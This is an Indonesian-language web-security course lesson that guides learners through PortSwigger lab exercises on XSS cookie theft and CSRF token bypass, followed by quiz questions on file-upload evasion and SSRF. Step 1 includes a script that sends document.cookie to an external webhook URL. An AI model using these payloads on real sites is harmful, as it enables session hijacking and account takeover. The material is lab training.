# 💀 Week 17 · Day 5: Lab & Weekly Mission PortSwigger XSS/CSRF

> **Rank**: BREACH | **Minggu ke-17**, Hari 5/5 | **Durasi**: ~60–90 menit

---

## 📊 Progress Tracker

### Rank Progress
[▓▓▓▓▓▓░░░░] 60% — BREACH Rank (Minggu 3 dari 5)

### Overall Journey
[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░] 70% — Hari 85 dari 120

### Rank Map
✅ VOID → ✅ CIPHER → ✅ PACKET → ✅ FORGE → 🔄 BREACH → ⬜ SENTINEL

---

## 📝 Rekap Minggu Ini

Pengetahuan teknis Anda dalam mendalami eksploitasi serangan sisi klien (*Client-Side Attacks*) dan teknik merantai kerentanan (*Chaining Vulns*) telah dilatih sepanjang minggu ini:

| Hari | Topik | Key Takeaway |
|------|-------|-------------|
| Day 1 | XSS & Payload Crafting | Membuat skrip khusus (*payload*) untuk mencuri *Cookie* dan melewati filter WAF. |
| Day 2 | CSRF & SSRF | Memaksa browser korban melakukan aksi tanpa disadari (*CSRF*), serta menipu *server* untuk mengakses jaringan internalnya sendiri (*SSRF*). |
| Day 3 | File Upload & IDOR | Mengunggah *Web Shell* PHP melalui celah *File Upload* dan memanipulasi parameter akses (*IDOR*). |
| Day 4 | Chaining Vulnerabilities | Menggabungkan celah keamanan berskala kecil (seperti *Self-XSS*, *CSRF*, *SSRF*) menjadi serangan berbahaya seperti *Account Takeover*. |

---

## 🧪 Hands-On Lab

### Prerequisites
- Koneksi internet yang stabil.
- Akun portal laboratorium simulasi di **[PortSwigger Web Security Academy](https://portswigger.net/web-security)**.
- Aplikasi *Burp Suite Community* untuk mencegat (*Intercept*) lalu lintas jaringan.

### Misi Hari Ini: "Eksploitasi Web Sisi Klien (XSS/CSRF)"

Pada lab ini, Anda ditugaskan meluncurkan eksploitasi di lingkungan *Client-Side*. Anda harus menjebak browser target agar mengeksekusi *payload* berbahaya yang Anda sediakan.

### Step 1: Merampas Sesi Otentikasi (XSS Cookie Stealing)
1. Buka lab PortSwigger bertajuk: **"Exploiting cross-site scripting to steal cookies"**.
2. Anda akan menemukan fitur komentar pada halaman *Blog*.
3. Buka *Burp Collaborator* (atau layanan eksternal penangkap HTTP request seperti *Webhook.site*). Salin URL dari layanan tersebut.
4. Sisipkan *payload XSS* pada kolom komentar:
   ```html
   <script>
   fetch('https://webhook.site/alamat_webhook_milikmu', {
     method: 'POST',
     mode: 'no-cors',
     body: document.cookie
   });
   </script>
   ```
5. Pantau layanan *Webhook* Anda. Saat bot Admin (korban simulasi) PortSwigger memuat halaman komentar tersebut, *Session Cookie* milik Admin akan dikirimkan otomatis ke layar Webhook Anda. Gunakan *Cookie* tersebut untuk *login* sebagai Admin!

### Step 2: Mengakali Validasi CSRF (Token Bypass)
1. Buka lab bertajuk: **"CSRF where token validation depends on token being present"**.
2. Di lab ini, sistem memvalidasi keabsahan token *CSRF*, TAPI **hanya jika** token tersebut dilampirkan dalam permintaan. Jika parameter token tersebut dihapus sepenuhnya, server justru menganggapnya sah!
3. Gunakan *Burp Suite*. Cegat (*Intercept*) permintaan formulir *"Update Email"*.
4. Buatlah halaman eksploitasi *HTML* (menggunakan fitur *CSRF PoC Generator* di Burp Suite). Hapus elemen `<input type="hidden" name="csrf"...>` secara keseluruhan dari *HTML* tersebut.
5. Uji skrip *HTML* itu di browser. Email pengguna akan berhasil diubah karena server gagal mendeteksi serangan CSRF saat *token* sama sekali tidak dikirimkan.

---

## 🎯 Weekly Mission

### Misi: "Dokumentasi Payload (Exploitation Cheatsheet)"

**Deskripsi:** *Bug Hunter* profesional jarang mengetik ulang *Payload* rumit dari awal. Mereka menyimpannya di dalam lembar referensi (*Cheat Sheet*) agar mudah digunakan kapan saja.

**Tugas Mandiri:** Selesaikan **5 Lab PortSwigger** dengan topik *XSS, CSRF, atau File Upload*. Selama menyelesaikan lab, kumpulkan 10 *Payload* andalan yang terbukti berhasil dan catat dalam dokumen Anda.

**Deliverables:**
1. Buat satu dokumen *Markdown* bernama `PAYLOAD_CHEATSHEET.md`.
2. Isi dokumen mencakup:
  - **XSS Payloads:** (Tulis 5 variasi XSS *payload*, khususnya yang bisa mem-*bypass* WAF. Contoh: `<img src=x onerror=...>`, `<svg onload=...>`, dll).
  - **Lab Writeups:** (Catat 5 judul lab PortSwigger yang sukses diselesaikan beserta rangkuman singkat taktik penyelesaiannya).

**Kriteria Sukses:**
- [ ] 5 mesin lab PortSwigger diselesaikan (berstatus *Solved*).
- [ ] Tersedia dokumentasi 10 variasi Payload (jangan hanya menggunakan `<script>alert(1)</script>`).
- [ ] Tersedia ringkasan temuan di lab-lab tersebut.

---

## 💡 Knowledge Check

<details>
<summary>❓ [MUDAH] Dalam pencurian sesi menggunakan injeksi XSS, elemen JavaScript apa yang diakses dan dikirimkan oleh skrip ke server penyerang?</summary>

**Jawaban:** Atribut `document.cookie`.
</details>

<details>
<summary>❓ [MUDAH] Apa tujuan utama dari serangan Cross-Site Request Forgery (CSRF)?</summary>

**Jawaban:** Memaksa browser korban (yang sedang login) untuk mengeksekusi permintaan berbahaya (seperti transfer uang atau ganti email) **tanpa sepengetahuan korban**.
</details>

<details>
<summary>❓ [SEDANG] Ketika server memblokir ekstensi `shell.php` pada fitur unggah file, teknik manipulasi nama file apa yang bisa dicoba?</summary>

**Jawaban:** Menggunakan ekstensi ganda (*Double Extension*) seperti `shell.php.jpg` atau injeksi *Null Byte* seperti `shell.php%00.jpg`.
</details>

<details>
<summary>❓ [SEDANG] Alamat IP lokal mana yang paling sering dieksploitasi dalam serangan SSRF untuk mengakses dasbor internal server?</summary>

**Jawaban:** IP Localhost `127.0.0.1` (atau nama host `localhost`).
</details>

<details>
<summary>❓ [SULIT] Jelaskan skenario perantaian kerentanan (Chaining) antara celah CSRF (mengganti email) untuk mencapai pengambilalihan akun (Account Takeover)!</summary>

**Jawaban:** Penyerang menipu korban untuk mengeklik halaman HTML berisi eksekusi formulir *CSRF*. Alamat email korban terganti secara otomatis menjadi alamat email milik penyerang. Kemudian, penyerang menggunakan fitur "Lupa Password", dan tautan pemulihan sandi dikirimkan ke kotak masuk penyerang. Akun berhasil diambil alih secara penuh.
</details>

---

## 📋 Weekly Checklist

- [ ] Saya memahami alur eksekusi *Payload* pencurian sesi (*Cookie Stealing*).
- [ ] Saya mengerti serangan pemalsuan otorisasi (*CSRF*) dan manipulasi sisi *backend* (*SSRF*).
- [ ] Saya mengetahui taktik *Double Extension* & *Null Byte* pada celah *File Upload*.
- [ ] Saya bisa menjelaskan konsep merantai kerentanan (*Chaining Vulnerabilities*).
- [ ] Saya telah menuntaskan tugas membuat `PAYLOAD_CHEATSHEET.md` (Weekly Mission).

---

## 💬 Diskusi Minggu Ini

1. Setelah seminggu membedah berbagai kerentanan di sisi antarmuka klien (XSS, CSRF), menurut Anda mana yang dampaknya lebih berbahaya di dunia nyata: kebocoran *database* dari *SQL Injection*, atau akun admin dicuri secara diam-diam melalui *CSRF/XSS*? Mengapa celah di sisi klien (pengguna) kerap berakibat sama fatalnya dengan celah di sisi *server*?

---

## 🏆 Achievement Unlocked!

```
┌─────────────────────────────────────┐
│                                     │
│     🎖️ THE CLIENT CORRUPTOR         │
│          Week 17 Complete           │
│  "Trust no link, trust no script,   │
│        trust no parameter."         │
│                                     │
└─────────────────────────────────────┘
```

Selamat! Anda telah berhasil menuntaskan pelatihan eksploitasi web dari sisi klien (*Client-Side Attacks*) pada minggu ini!

---

## ➡️ Preview Minggu Depan

**Minggu 18: Burp Suite & Advanced Tooling**

Masa-masa eksploitasi secara manual perlahan berakhir! Minggu depan, kita akan mulai menggunakan *senjata utama* para *Bug Hunter* profesional: **Burp Suite**. Kita akan belajar mencegat permintaan (*Intercept*), meluncurkan pengujian skala besar (*Intruder*), dan menggunakan serangan otomatis secara efisien.

---

*📅 TISS Null Teaming · Week 17 · Day 5 · BREACH Rank*
